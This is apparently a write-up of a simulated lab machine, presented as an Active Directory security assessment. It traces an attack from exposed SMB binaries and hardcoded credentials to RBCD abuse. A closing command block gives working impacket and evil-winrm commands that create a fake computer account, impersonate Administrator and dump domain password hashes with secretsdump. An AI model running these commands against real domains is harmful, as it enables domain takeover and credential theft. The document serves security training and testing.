# Security Assessment & Active Directory Infrastructure Audit: Support

## 📌 Executive Summary
This technical report details an advanced Active Directory (AD) security assessment performed on a simulated enterprise Windows environment. The evaluation highlights critical risks including unsecured SMB shares with exposed compiled binaries, hardcoded credential leakage via binary reverse engineering, LDAP attribute inspection, and domain control compromise via Resource-Based Constrained Delegation (RBCD) abuse.

---

## 🛠️ Methodology & Tooling
* **Network & Service Enumeration:** Comprehensive port mapping and vulnerability profiling using `nmap`.
* **SMB Share Auditing:** Inspecting file shares for exposed administrative scripts and compiled applications.
* **Binary Decompilation & Static Analysis:** Using tools like `ilspycmd` to review .NET binaries and isolate hardcoded authentication strings or obfuscation logic.
* **Directory Service Auditing:** Querying Active Directory via LDAP and BloodHound to map access control lists (ACLs) and group memberships.
* **Kerberos Delegation Exploitation:** Simulating computer object creation quotas (`ms-DS-MachineAccountQuota`) and configuring RBCD links for ticket generation (S4U2Self/S4U2Proxy).
* **Remote Session Management:** Validating initial access and administrative persistence through WinRM (`evil-winrm`).

---

## 🔍 Technical Attack Path & Findings

### Phase 1: Reconnaissance & Shared Resource Exposure
Initial network mapping identifies standard directory service ports alongside an unauthenticated or misconfigured SMB file share. Enumerating file assets within administrative shares often exposes legacy automation tools, deployment scripts, or compiled binaries left behind by administrative staff.

### Phase 2: Credential Extraction & Initial Access
* **Binary Decompilation:** Compiled applications (.NET/C# binaries) found on shared repositories can be reverse-engineered using decompiler utilities. Logic analysis often exposes hardcoded service credentials or proprietary encoding routines (such as XOR/Base64 transformations).
* **Directory Metadata Inspection:** Analyzing directory user objects frequently uncovers secondary credential data stored within non-standard attributes (e.g., descriptions or auxiliary profile fields).
* **Initial Session Validation:** Leveraging isolated credentials to authenticate via remote management interfaces (WinRM) grants initial low-privileged domain user access.

### Phase 3: Domain Privilege Mapping (BloodHound)
Mapping permission structures via graph-based analytics tools (BloodHound) identifies dangerous misconfigurations:
* Membership in auxiliary support groups possessing broad privileges (`GenericAll` or control flags) over critical core infrastructure components, such as Domain Controller computer objects.

### Phase 4: Privilege Escalation via Resource-Based Constrained Delegation (RBCD)
When a low-privileged account or managed group holds write privileges (`GenericAll` or `WriteProperty`) over a target computer object (like the Domain Controller):
1. **Computer Account Provisioning:** Utilizing standard domain quotas (`ms-DS-MachineAccountQuota`) to provision an attacker-controlled auxiliary computer object.
2. **Delegation Configuration:** Modifying the target computer's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute to trust the newly created computer identity.
3. **Ticket Generation:** Requesting service tickets through S4U2Self/S4U2Proxy mechanisms while impersonating high-privilege administrative accounts (e.g., Domain Administrator).

### Phase 5: Administrative Control & Hash Dumping
Using generated Kerberos cache (`ccache`) credentials combined with specialized protocol utility tools (`secretsdump`) allows extraction of core domain master hashes (NTDS.dit entries), achieving total domain ownership and persistence via remote shell channels.

---

### 💻 Quick Reference: Technical Commands & Workflow

```bash
# 1. Comprehensive Port & Service Scanning
nmap -p- --open -n -Pn -sS --min-rate 5000 -vvv <TARGET_IP> -oG allPorts
nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sCV <TARGET_IP> -oN target_services

# 2. Decompiling Binaries for Credential Extraction (.NET)
ilspycmd TargetBinary.exe > decompiled_source.cs

# 3. Initial Remote Access via WinRM
evil-winrm -i <TARGET_IP> -u '<USER>' -p '<PASSWORD>'

# 4. Exploiting RBCD (Creating Fake Computer & Delegating)
impacket-addcomputer '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <TARGET_IP> -computer-name 'FAKECOMP$' -computer-pass 'CompPass123!'
impacket-rbcd '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <TARGET_IP> -action write -delegate-from 'FAKECOMP$' -delegate-to 'DC$'

# 5. Requesting Admin Kerberos Ticket & Dumping NTDS.dit
impacket-getST '<DOMAIN>/FAKECOMP$:CompPass123!' -dc-ip <TARGET_IP> -impersonate Administrator -spn cifs/DC.<DOMAIN>
export KRB5CCNAME="Administrator@cifs_DC.<DOMAIN>@<REALM>.ccache"
impacket-secretsdump -k -no-pass -dc-ip <TARGET_IP> -just-dc-user Administrator <DOMAIN>/Administrator@dc.<DOMAIN>